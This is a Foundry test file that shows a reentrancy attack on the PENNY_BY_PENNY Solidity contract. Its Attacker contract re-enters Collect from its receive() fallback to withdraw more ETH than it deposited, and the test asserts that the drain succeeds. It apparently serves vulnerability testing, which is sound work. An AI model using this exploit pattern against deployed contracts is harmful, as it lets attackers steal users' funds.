
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {PENNY_BY_PENNY, LogFile} from "../src/PENNY_BY_PENNY.sol";

contract TestReentrancyPENNY_BY_PENNY is Test {
    PENNY_BY_PENNY public _contractUnderTest;
    LogFile public _logFile;
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new PENNY_BY_PENNY();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 ether);
        _contractUnderTest.Initialized();
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        // --- 1. Constraints & Pitfall Avoidance ---
        vm.assume(attackVal >= 1 ether);
        vm.assume(attackVal <= 10 ether);

        // --- 2. State Configuration (Pre-Condition) ---
        // The contract is already initialized in setUp

        // --- 3. Funding ---
        // Fund the Victim contract with extra ETH so attacker can drain more than deposited
        vm.deal(address(_contractUnderTest), attackVal * 3);
        
        // Fund the Attacker
        vm.deal(address(_attacker), attackVal * 2);

        // Fund the Test Contract
        vm.deal(address(this), attackVal * 2);

        // --- 4. Trigger Attack ---
        _attacker.setupAttack{value: attackVal}(attackVal);
        
        // Warp time to pass the unlock time check
        vm.warp(block.timestamp + 1);
        
        _attacker.attack(attackVal);

        // --- 5. Verify Success ---
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    PENNY_BY_PENNY public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public storedAttackVal;

    constructor(address victimAddress) {
        victim = PENNY_BY_PENNY(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;
        
        // Deposit ETH into the victim contract with 0 lock time
        victim.Put{value: val}(0);
    }

    function attack(uint256 val) public {
        // 1. Capture Initial State - store attacker's balance before the attack
        initialSnapshot = address(this).balance;
        
        // 2. Store the value for the re-entrant call
        storedAttackVal = val;
        
        // 3. Call the vulnerable Collect function
        victim.Collect(val);
        
        // 4. Verify Success Conditions
        // If we received more than we deposited, the reentrancy was successful
        // We should have received val twice (initial call + reentrant call)
        if (address(this).balance > initialSnapshot + val) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        // Limit to 1 re-entrant call to avoid running out of gas
        if (attackCallCount < 1) {
            attackCallCount++;
            // Re-enter the Collect function before state is updated
            victim.Collect(storedAttackVal);
        }
    }
}
